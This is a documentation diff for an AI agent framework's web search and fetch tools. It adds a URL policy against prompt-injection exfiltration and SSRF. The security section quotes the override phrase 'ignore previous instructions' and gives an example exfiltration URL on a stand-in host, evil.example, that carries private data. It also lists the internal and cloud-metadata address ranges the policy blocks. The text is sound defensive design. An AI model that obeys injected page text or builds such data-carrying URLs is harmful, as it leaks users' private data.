@@ -21,12 +21,12 @@ Two ways to give an agent the web:
 In an agent file: `tools: [web_search, web_fetch]`.
 
 - `web_search {query, max_results?}` returns `{ untrusted, note, query, results: [{ title, url, snippet, published? }] }`.
-- `web_fetch {url}` (http/https only) returns `{ untrusted, note, url, title?, content, truncated?, totalChars? }`.
+- `web_fetch {url}` (public http/https URLs returned by `web_search` in the same run; see [Security](#security-prompt-injection-and-exfiltration)) returns `{ untrusted, note, url, title?, content, truncated?, totalChars? }`.
 - Both have risk `read` and count against `maxToolCalls`.
 
 `web` options: `provider` (`tavily` default, or `anthropic-native`), `apiKey` (default env `TAVILY_API_KEY`;
 `${env:...}` works), `searchDepth`, `topic`, `includeDomains` / `excludeDomains`, `maxResults` (default 5),
-`maxResultsCap` (default 10), `maxChars` per snippet (default 1000), `maxFetchChars` (default 8000), `cacheTtlMs`
+`maxResultsCap` (default 10), `fetchPolicy` (default `search-results`), `maxUrlLength` (default 512), `maxChars` per snippet (default 1000), `maxFetchChars` (default 8000), `cacheTtlMs`
 (default 0: off). `anthropic-native` runs one small model call with the hosted search (`model`, default
 `anthropic/claude-haiku-5-5`; `maxUses`): search only, no `web_fetch`, and its tokens are not part of the calling
 run's usage. To have searches priced in the run, use the hosted tool directly (below).
@@ -90,7 +90,7 @@ Or in config, referenced by name from `tools`:
   risk `read` (allowed); other types default to `exec` (asked, so dropped without an approver). Middleware
   `beforeTool` / `afterTool` hooks do not see hosted calls: the provider runs them.
 
-## Security: prompt injection
+## Security: prompt injection and exfiltration
 
 Web pages are written by strangers. Anything a search or fetch returns can contain text that tries to steer the model
 ("ignore previous instructions", fake tool output, links to exfiltrate data to). reinloop marks built-in results with
@@ -100,5 +100,28 @@ Web pages are written by strangers. Anything a search or fetch returns can conta
 - prefer a separate research agent with only read tools, delegated to by the agent that acts;
 - restrict domains (`includeDomains`, `allowed_domains`) when the sources are known;
 - set `maxToolCalls` and `maxCostUsd` budgets.
+
+### `web_fetch` URL policy
+
+A fetch can be steered by an injected page into leaking data (a URL like `https://evil.example/?d=<private data>`) or
+into reaching internal services (SSRF, relevant for custom providers that fetch from your network). Option
+`fetchPolicy` (config `web.fetchPolicy`):
+
+- `search-results` (default): `web_fetch` only accepts a URL that `web_search` returned earlier in the same run
+  (per-run allowlist keyed by run id, exact match after normalization; subagent runs have their own list). A URL the
+  model invents or edits (extra query string, other path) is refused, so it cannot carry data out.
+- `any`: any public URL. Only for trusted prompts or when the provider fetches in an isolated environment; the
+  exfiltration channel is open.
+- `off`: no `web_fetch` tool.
+
+In every mode, before the provider is called: only `http`/`https`; no credentials in the URL (`user:pw@`); no
+IP-literal hosts (v4, v6, decimal/hex forms), so no loopback, private (10/8, 172.16/12, 192.168/16) or link-local
+(169.254/16, cloud metadata) targets; no `localhost`, `*.localhost`, `*.local`, `*.internal`, `*.lan` or
+single-label names; URL length at most `maxUrlLength` (default 512); fragments are stripped and the normalized URL is
+what gets fetched. Refusals come back as tool errors (`web_fetch refused: ...`) so the model can recover.
+
+Limits: the check is on the URL text. A public DNS name that resolves to a private address (DNS rebinding) or a
+redirect to one is not detected here; enforce egress rules at the network level for providers that fetch locally.
+Search queries can also carry data: keep the other mitigations below.
 
 Example (offline): `node examples/web-research.ts`.
